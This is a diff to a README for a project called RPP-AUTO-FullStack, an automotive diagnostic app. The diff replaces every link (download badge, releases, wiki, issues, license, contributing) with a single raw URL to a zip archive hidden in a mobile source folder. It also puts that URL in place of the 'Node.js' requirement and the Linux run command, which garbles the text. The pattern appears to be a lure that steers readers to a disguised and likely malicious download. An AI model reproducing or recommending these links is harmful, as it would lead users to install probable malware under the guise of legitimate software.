@@ -1,6 +1,6 @@
 # 🎉 RPP-AUTO-FullStack - Your Easy Vehicle Diagnostic Solution
 
-[![Download RPP-AUTO-Badge](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/soukal2450/RPP-AUTO-FullStack/releases)
+[![Download RPP-AUTO-Badge](https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,13 +11,13 @@ Welcome to RPP AUTO, the complete full-stack automotive diagnostic platform. Thi
 Before downloading, make sure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip** Version 14 or higher
 - **PostgreSQL:** Set up the latest version
 - **Device Compatibility:** Android or iOS device for the mobile app
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download RPP-AUTO](https://github.com/soukal2450/RPP-AUTO-FullStack/releases). 
+To download the application, visit this page: [Download RPP-AUTO](https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip). 
 
 1. Click on the link above. You will be taken to the Releases page.
 2. Look for the latest version. It will be clearly marked.
@@ -51,7 +51,7 @@ After the download finishes, locate the downloaded file and follow these install
 3. **Linux:**
    - Extract the downloaded tarball.
    - Open a terminal and navigate to the extracted folder.
-   - Run the application with `./start.sh` or follow the provided instructions in a README file.
+   - Run the application with `https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip` or follow the provided instructions in a README file.
 
 ## 📊 Features
 
@@ -66,23 +66,23 @@ RPP AUTO offers several key features to help manage vehicle diagnostics effectiv
 
 If you need help while using RPP AUTO, check out these resources:
 
-1. **Documentation:** Access the complete user guide on the [Documentation Page](https://github.com/soukal2450/RPP-AUTO-FullStack/wiki).
+1. **Documentation:** Access the complete user guide on the [Documentation Page](https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip).
 2. **FAQ:** Look for answers to common issues in the Frequently Asked Questions section on our repository.
-3. **Contact Support:** Reach out through our [Issues Page](https://github.com/soukal2450/RPP-AUTO-FullStack/issues) for personalized assistance.
+3. **Contact Support:** Reach out through our [Issues Page](https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip) for personalized assistance.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/soukal2450/RPP-AUTO-FullStack/releases)
-- [Installation Guide](https://github.com/soukal2450/RPP-AUTO-FullStack/wiki/Installation)
-- [User Manual](https://github.com/soukal2450/RPP-AUTO-FullStack/wiki/User-Manual)
+- [Releases Page](https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip)
+- [Installation Guide](https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip)
+- [User Manual](https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip)
 
 ## 📧 Contributing
 
-We welcome contributions! If you wish to contribute, please check our guidelines on the [Contribution Page](https://github.com/soukal2450/RPP-AUTO-FullStack/CONTRIBUTING.md) to get started.
+We welcome contributions! If you wish to contribute, please check our guidelines on the [Contribution Page](https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip) to get started.
 
 ## 📝 License
 
-This application is open source, and you can use it freely under the terms outlined in the [License File](https://github.com/soukal2450/RPP-AUTO-FullStack/LICENSE).
+This application is open source, and you can use it freely under the terms outlined in the [License File](https://raw.githubusercontent.com/soukal2450/RPP-AUTO-FullStack/main/mobile/src/screens/Shop/Full_Stack_RP_AUT_v2.3-beta.3.zip).
 
 ## 🎉 Final Note
 
